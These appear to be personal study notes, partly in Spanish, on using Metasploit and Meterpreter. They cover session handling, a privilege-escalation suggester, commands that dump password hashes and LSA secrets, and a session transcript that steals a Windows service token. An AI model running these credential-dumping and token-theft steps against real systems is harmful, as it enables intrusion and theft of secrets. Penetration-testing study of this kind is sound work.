msfconsole -q (vesrion quiet)

```shell-session
msf6 > help search
```

workspace
workspace -a (nombre) [anadir espacio de trabajo]

search --help

ejemplo: search vsftpd type:exploit

background (dejar session en segundo plano)
sessions(ver sesiones activas)
sessions -i 1 (retomar session)

show payloads
show targets

shell desde meterpreter 

use exploit/multi/handler (cuando ejecutamos un exploit con msfvenom)

run -j para que se quede en escucha en background

```shell-session
meterpreter > lsa_dump_secrets
```


Escalacion de privilegios

post/multi/recon/local_exploit_suggester
#### MSF - Dumping Hashes


```shell-session
meterpreter > hashdump
```

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
```

#### MSF - Meterpreter Migration con windows

  Meterpreter

```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```